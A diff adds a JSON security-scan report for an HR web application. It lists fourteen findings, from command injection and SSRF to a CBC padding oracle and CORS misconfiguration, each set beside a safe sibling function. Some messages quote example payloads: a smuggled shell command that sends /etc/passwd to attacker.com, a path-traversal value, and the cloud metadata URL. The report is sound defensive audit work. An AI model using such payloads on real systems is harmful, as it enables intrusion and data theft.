@@ -1,0 +1,361 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-shell-true",
+      "path": "app/routes/import-export.tsx",
+      "start": {
+        "line": 49,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 66,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertRosterExport() builds a shell command string by directly interpolating the attacker-controlled `exportFormat` form field (`formData.get(\"exportFormat\")`, action intent `export_employees` at line 459) into `cmd = \"soffice --headless --convert-to ${exportFormat} --outdir ${workDir} ${inputPath}\"` and executes it with `spawn(cmd, [], { shell: true })` (line 58). Because the value runs through a shell, an authenticated hr_admin/payroll_specialist can submit `exportFormat` containing shell metacharacters (e.g. `xlsx; curl attacker.com/$(cat /etc/passwd)`) to achieve arbitrary OS command execution. Contrast with the sibling `convertOnboardingExport` (lines 74-97), which validates the format against a fixed allowlist and calls `spawn(\"soffice\", [...args], { shell: false })` \u2014 the safe pattern that this function does not follow.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.unsanitized-header-path-join",
+      "path": "app/routes/import-export.tsx",
+      "start": {
+        "line": 33,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 41,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "saveComplianceSnapshot() takes `batchLabel` straight from the attacker-controlled `x-archive-label` request header (read at line 444 in the `export_employees` action) and uses it unsanitized in `path.join(COMPLIANCE_ARCHIVE_DIR, `${batchLabel}.csv`)` (line 38) before writing the file there with `writeFile`. A header value like `../../../../var/www/html/shell` traverses out of the intended `var/compliance-archive` directory, allowing an authenticated hr_admin/payroll_specialist to write a CSV file to an arbitrary path on disk. Contrast with the equivalent `writePolicyLedgerSnapshot` in app/routes/policies.tsx (line 508), which sanitizes its batch name with `path.basename(batchNameRaw).replace(/[^a-zA-Z0-9_-]/g, \"_\")` before use \u2014 the safe pattern this function skips.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.handlebars-server-side-template-injection",
+      "path": "app/routes/onboarding.tsx",
+      "start": {
+        "line": 293,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 299,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderTaskReminderNote() compiles a fully attacker-controlled string with `Handlebars.compile(noteTemplate)` where `noteTemplate` comes directly from `formData.get(\"noteTemplate\")` (line 264, intent `preview_reminder_note`, reachable by any hr_admin or manager). Handlebars templates supplied by the caller (not just the merged data) allow Server-Side Template Injection \u2014 known Handlebars gadgets (e.g. via `lookup`/`with` and prototype access) can escape the sandbox and achieve arbitrary code execution in the Node process. Contrast with `renderAcknowledgementReminder` in app/routes/policies.tsx (lines 491-499), which compiles a fixed, hardcoded template string and only merges plain data fields \u2014 the safe pattern this function does not follow.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine (Server-Side Template Injection)",
+            "CWE-94: Improper Control of Generation of Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.unvalidated-header-url-fetch",
+      "path": "app/routes/policies.tsx",
+      "start": {
+        "line": 472,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 485,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncPolicyFromSourceDocument() reads `sourceDocumentUrl` directly from the attacker-controlled `x-policy-source-url` request header (line 473) and passes it straight to `fetch(sourceDocumentUrl)` (line 478) with no hostname/scheme allowlist, then returns the first 5000 characters of the response body to the caller. Any hr_admin can use the `sync_policy_source` intent to make the server issue requests to arbitrary internal or external hosts (e.g. `http://169.254.169.254/latest/meta-data/` or an internal admin service) and read back the response \u2014 a classic SSRF. Contrast with `fetchCompensationBenchmarkDocument` in app/utils/payroll-provider.server.ts (lines 39-61), which validates the target hostname against a fixed `APPROVED_BENCHMARK_HOSTS` allowlist before fetching \u2014 the safe pattern this handler does not follow.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-with-credentials",
+      "path": "app/routes/compensation.tsx",
+      "start": {
+        "line": 183,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 200,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The compensation loader reflects the request's `Origin` header verbatim into `Access-Control-Allow-Origin` while also sending `Access-Control-Allow-Credentials: true` (lines 183, 194-196). This lets a script on ANY origin issue a credentialed (`fetch(..., { credentials: 'include' })`) cross-site request to `/compensation` and read the JSON response \u2014 including employee salaries, bonuses, and approval history \u2014 using the victim's own session cookie. Combined with the session cookie's `sameSite: \"none\"` setting (app/utils/session.server.ts line 8), the browser will attach the session cookie to the cross-site request, and the reflected-origin ACAO header lets the attacker's JavaScript read the response body. This is a confirmed cross-origin sensitive-data exposure, not a theoretical CORS nitpick.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.prototype-pollution.object-assign-json-parse-header",
+      "path": "app/routes/api.notifications.tsx",
+      "start": {
+        "line": 97,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 107,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyNotificationDeliveryPrefs() takes the `x-notification-prefs` request header (attacker-controlled, reachable by any authenticated user via the `update_delivery_prefs` intent at line 70-74), `JSON.parse`s it, and merges it into the shared `notificationDeliveryConfig` object with `Object.assign(notificationDeliveryConfig, parsed)` (line 101). Because `JSON.parse` creates a literal own-property named `__proto__` when the input contains `{\"__proto__\": {...}}`, and `Object.assign` copies that property via a normal `[[Set]]`, an attacker can pollute `Object.prototype` for the whole Node process, potentially affecting authorization checks or other logic elsewhere that relies on default object properties. Contrast with the very next handler, `applyDepartmentDigestPrefs` (lines 121-135), which copies only an explicit allowlist of fields (`ALLOWED_DIGEST_FIELDS`) \u2014 the code comment even calls out that this avoids letting `__proto__` merge in, which is exactly what the vulnerable function above fails to do.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.unrestricted-object-spread-into-update",
+      "path": "app/routes/employees.$id.edit.tsx",
+      "start": {
+        "line": 163,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 180,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreEmployeeProfileDraft() parses an uploaded JSON file (`JSON.parse(await draftFile.text())`, line 68, intent `restore_draft`) and writes it straight through with `db.update(employees).set({ ...draft, updatedAt: new Date() })` (line 170) with no field allowlist. Any key present in the uploaded document is written to the `employees` row, letting an hr_admin (intentionally or via a tampered/malicious draft file from an untrusted source) overwrite columns never exposed by the actual edit form \u2014 including `taxId`, `hrNotes`, `isSensitiveInfoReviewed`, `managerId`, or `departmentId` \u2014 bypassing whatever validation the normal form path applies. This is a mass-assignment vulnerability: the shape of untrusted input, not an explicit column list, decides what gets written.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-unscoped-record-update",
+      "path": "app/routes/compensation.tsx",
+      "start": {
+        "line": 532,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 554,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "annotateCompensationRecord() lets any authenticated hr_admin OR manager (both roles pass the `requireRole(request, [\"hr_admin\", \"manager\"])` check at the top of the action, line 206) update the `notes` field of ANY compensation record purely by its `recordId` (line 537-540), with no check that the record belongs to one of the manager's direct reports. Contrast with the `create_request` handler in the same file (lines 258-265), which explicitly verifies `targetEmployee.managerId !== currentEmployee.id` before allowing a manager to act on a record. A manager can therefore read (via the loader's row list) and overwrite compensation notes for employees outside their team \u2014 a broken access control / IDOR flaw the code comment above the function even acknowledges (\"isn't scoped to records the caller is actually involved in approving\").",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.data-exposure.secret-and-pii-in-url-query-string",
+      "path": "app/utils/payroll-provider.server.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "notifyPayrollProvider() builds `http://${PAYROLL_PROVIDER_HOST}/api/compensation/submit?api_key=${apiKey}&employeeId=${employeeId}&salary=${salary}&effectiveDate=...` (lines 15-18) and sends it as a plaintext HTTP GET. Both the provider's secret API key and the employee's salary (sensitive PII) are placed in the URL query string over an unencrypted `http://` connection, so they are exposed to any network intermediary, and are also very likely to be captured in access logs, proxy logs, and browser/HTTP client history on both ends of the request. Secrets and sensitive data should be sent in a request body (or an Authorization header) over TLS, not as URL query parameters over plaintext HTTP.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings",
+            "CWE-319: Cleartext Transmission of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.cbc-padding-oracle-distinguishable-errors",
+      "path": "app/utils/onboarding-progress.server.ts",
+      "start": {
+        "line": 34,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 56,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resumeOnboardingProgress() decrypts a client-supplied token with AES-256-CBC (no MAC/AEAD) and explicitly distinguishes a PKCS#7 padding failure (`message.includes(\"bad decrypt\")` \u2192 throws `\"invalid_padding\"`) from other decryption failures (line 49-52). This is exposed to the network in app/routes/onboarding.tsx's `handleResumeOnboardingWizard` (lines 319-331, intent `resume_wizard`), which returns a distinct error message (\"Your resume link looks corrupted\") specifically when `err.message === \"invalid_padding\"`. An attacker who can submit modified ciphertext and observe which of the two error responses comes back has a classical CBC padding oracle (Vaudenay attack), letting them decrypt or forge arbitrary onboarding-wizard progress tokens byte-by-byte without knowing the key. Contrast with the sibling `resumeBenefitsElectionProgress` (lines 78-98), which uses AES-256-GCM (authenticated encryption) and collapses every failure mode into one generic `\"resume_failed\"` error \u2014 the safe pattern this function does not follow.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-696: Incorrect Behavior Order",
+            "CWE-203: Observable Discrepancy (Padding Oracle)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.unvalidated-header-redirect",
+      "path": "app/routes/requests.tsx",
+      "start": {
+        "line": 505,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 512,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "closeHrRequestWithReason() reads the `X-Return-To` request header and, if present, calls `redirect(returnTo)` with no validation whatsoever (lines 509-512). Contrast with the near-identical shift-coverage feature in app/routes/shift-coverage.tsx, whose `resolveCoverageReturnDestination()` (lines 54-58) checks the equivalent `X-Return-To` value against a fixed `ALLOWED_COVERAGE_RETURN_PATHS` allowlist before redirecting. Here, any value supplied in that header is redirected to unchanged, allowing an open redirect to an attacker-controlled external URL for any hr_admin/manager session that can be made to submit this header.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.stack-trace-gated-by-request-param",
+      "path": "app/routes/audit-log.tsx",
+      "start": {
+        "line": 66,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 79,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildAuditLogErrorResponse() returns the raw internal error message and full stack trace (`error?.message`, `error?.stack`) plus the request's filter values to the client whenever the request-supplied `report_mode` query parameter equals `\"full\"` (lines 72-77), instead of gating this on server-side environment (e.g. `NODE_ENV !== \"production\"`). Any hr_admin can force a query failure (e.g. via a malformed `date_from`/`date_to` value causing the `::timestamp` cast at lines 104/108 to throw) and append `&report_mode=full` to have the server return internal stack traces and file paths in the response body.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.samesite-none-weakens-csrf-protection",
+      "path": "app/utils/session.server.ts",
+      "start": {
+        "line": 5,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The main session cookie is configured with `sameSite: \"none\"` (line 8), which explicitly opts the authentication cookie into being sent on cross-site requests. This removes a key browser-level CSRF mitigation for every state-changing action in the app (compensation approvals, role changes, document deletion, etc.) and, combined with the reflected-Origin CORS misconfiguration on `/compensation` (see finding above), directly enables a cross-site attacker to read authenticated responses using the victim's session.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1275: Sensitive Cookie with Improper SameSite Attribute",
+            "CWE-352: Cross-Site Request Forgery (CSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.unsanitized-query-param-in-content-disposition",
+      "path": "app/routes/payroll.tsx",
+      "start": {
+        "line": 60,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 83,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "streamPayrollBatchCsv() takes `batch_label` directly from the query string (line 65) and splices it unsanitized into the `Content-Disposition` header value (`filename=\"payroll-batch-${batchLabel}.csv\"`, line 80). Unlike `renderDocumentManifest` in app/routes/documents.tsx (line 75, `rawLabel.replace(/[\\r\\n]/g, \"\").slice(0, 80)`), which strips CR/LF before use in the same kind of header, this value is not sanitized at all, allowing unescaped `\"` or control characters supplied by the caller to break out of the intended filename parameter of the response header.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
